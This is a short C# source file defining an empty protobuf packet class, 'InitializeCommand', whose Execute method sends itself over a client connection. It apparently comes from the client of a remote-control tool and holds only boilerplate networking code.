using ProtoBuf;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class InitializeCommand : IPacket
    {
        public InitializeCommand()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}